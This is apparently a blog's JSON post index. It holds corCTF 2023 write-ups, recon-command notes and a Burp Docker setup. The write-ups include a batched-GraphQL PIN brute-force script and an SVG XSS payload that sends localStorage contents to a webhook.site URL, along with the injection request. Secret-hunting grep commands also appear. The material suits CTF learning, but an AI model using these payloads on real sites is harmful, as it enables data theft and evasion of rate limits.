[{"content":" web/force # 118 solves\nIn this challenge we are given a basic website which allows us to execute GraphQL queries. The goal here is to provide the correct pin in order to fetch the flag. The pin is a random integer between 0 and 100,000\nThe roadblock here is that we can only send 10 requests in a minute. To bypass we can use batched queries in graphql to brute force the pin.\nThe script to get the flag -\nimport requests url = \u0026#34;http://localhost:8000\u0026#34; # url = \u0026#34;https://web-force-force-899269d54e3ec7ab.be.ax/\u0026#34; def split(a, n): k, m = divmod(len(a), n) return (a[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(n)) def make_payload(start, end): data = \u0026#34;query {\u0026#34; for i in range(start, end): data += f\u0026#34;f{i}: flag(pin:{i})\\n\u0026#34; data += \u0026#34;}\u0026#34; return data ints = split(list(range(0, 10**5)), 10) for l in ints: data = make_payload(l[0], l[-1]) r = requests.post(url, data=data, headers={\u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39;}) if not r.ok: print(\u0026#34;Request too large. Range = {start}, {end}\u0026#34;) continue resp = r.json() s = set(list(resp.values())[0].values()) print(s) Output -\n{\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;corctf{S T O N K S}\u0026#39;, \u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} {\u0026#39;Wrong!\u0026#39;} web/frogshare # 33 solves\nIn this challenge we have a react based site where we can share svg images with the admin. The goal here is to perform XSS on admin to fetch the flag from local storage.\nThe application uses [external-svg-loader](https://www.npmjs.com/package/external-svg-loader) package to load the SVGs in the webpage. By default this will strip all javascript in the svg but we can enable it by setting attribute data-js=\u0026quot;enabled\u0026quot; in the svg tag.\nThe form to submit svg only has client-side validation and saves the svgProps json directly to the db without any server side validation when we send the api request.\nAnother issue with the application is that it spreads the svgProps instead of just selecting height, width, viewbox. Therefore, we can inject any attributes in the svg tag.\nWith above information, all that’s left is to craft our SVG payload and send a request which adds the data-js attribute and allows us to perform XSS.\nSVG Payload\n\u0026lt;svg version=\u0026#34;1.1\u0026#34; baseProfile=\u0026#34;full\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;polygon id=\u0026#34;triangle\u0026#34; points=\u0026#34;0,0 0,50 50,0\u0026#34; fill=\u0026#34;#009900\u0026#34; stroke=\u0026#34;#004400\u0026#34;/\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; navigator.sendBeacon(\u0026#34;https://webhook.site/49055ec9-e90d-4226-8a6b-86ceeb594345?f=\u0026#34; + localStorage.getItem(\u0026#34;flag\u0026#34;)); \u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt; Update frog request with our svg and data-js attribute\nPATCH /api/frogs?id=27 HTTP/1.1 Host: frogshare.be.ax Cookie: session=5c935345360d0... Content-Type: application/json Content-Length: 556 { \u0026#34;name\u0026#34;: \u0026#34;some frog\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgIG5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwczovL3dlYmhvb2suc2l0ZS80OTA1NWVjOS1lOTBkLTQyMjYtOGE2Yi04NmNlZWI1OTQzNDU/Zj0iICsgbG9jYWxTdG9yYWdlLmdldEl0ZW0oImZsYWciKSk7CiAgPC9zY3JpcHQ+Cjwvc3ZnPg==\u0026#34;, \u0026#34;svgProps\u0026#34;: { \u0026#34;height\u0026#34;: 64, \u0026#34;width\u0026#34;: 64, \u0026#34;data-js\u0026#34;: \u0026#34;enabled\u0026#34; } } Flag - corctf{M1nd_Th3_Pr0p_spR34d1ng_XSS_ThR34t}\n","date":"2 August 2023","permalink":"/posts/corctf2023-writeups/","section":"Posts","summary":"Writeups for web/force, web/frogshare from corCTF 2023","title":"corCTF 2023 writeups"},{"content":"","date":"2 August 2023","permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"2 August 2023","permalink":"/","section":"Ujjwal Verma","summary":"","title":"Ujjwal Verma"},{"content":" Notes from this video by STÖK # Enumerate subdomains - assetfinder --subs-only \u0026lt;domain\u0026gt; \u0026gt; domains\nhttprobe takes list of domains as input and outputs if http(s) server is listening. We pipe the output to tee command to see the output and write to file at the same time.\ncat domains | httprobe | tee hosts\nMeg is used to fetch many paths for many hosts.\nmeg -d 1000 -v /\nIn the output dir of meg run following grep cmd.\nH is for displaying file name in the output. n displays the line no. r recursive. i case-insensitive.\ngrep -Hnri \u0026lt;host\u0026gt; * | vim -\nSort and filter unique results\n%! sort -u\nRemove unnecessary detail %! grep -v Content-Sec\nUse gf to find common patterns like aws keys\ngf aws-keys\ngf base64 | vim -\n%!awk -F':' '{print $3}'\n:%s/\u0026lt;search\u0026gt;/\u0026lt;replace/\n:%!xargs -n1 -I{} sh -c 'echo {} | base64 -d'\nFinding specific html tags/attribs using html-tool\nfind . -type f | html-tool attribs src\nOne liner to find pattern in all of the git repo\n{ find .git/objects/pack/ -name \u0026#34;*.idx\u0026#34;|while read i;do git show-index \u0026lt; \u0026#34;$i\u0026#34;|awk \u0026#39;{print $2}\u0026#39;;done;find .git/objects/ -type f|grep -v \u0026#39;/pack/\u0026#39;|awk -F\u0026#39;/\u0026#39; \u0026#39;{print $(NF-1)$NF}\u0026#39;; }|while read o;do git cat-file -p $o;done|grep -E \u0026#39;pattern\u0026#39; ","date":"27 June 2019","permalink":"/posts/recon-tips/","section":"Posts","summary":"Notes from video by STÖK","title":"Recon tips by tomnomnom"},{"content":" How to setup Burp Suite inside a docker container # First we create a new directory - burpdock Inside the directory, create the following Dockerfile\nThen we create a build script. You can directly give the command but I personally like using a script to avoid giving all the args whenever I want a build a new version.\nMake the script executable and run it\nchmod +x build ./build Finally make the start script to run the container.\nNOTE: This may overwrite your existing burp settings. Make a backup mv ~/.java/.userPrefs/burp/prefs.xml ~/.java/.userPrefs/burp/prefs.xml.bkp Make the script executable and run it\nchmod +x start ./start After that simply run - burpsuite and you will see it open\n","date":"2 June 2019","permalink":"/posts/burpdock/","section":"Posts","summary":"How to setup Burp Suite inside a docker container","title":"Burpdock"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"1 January 0001","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"}]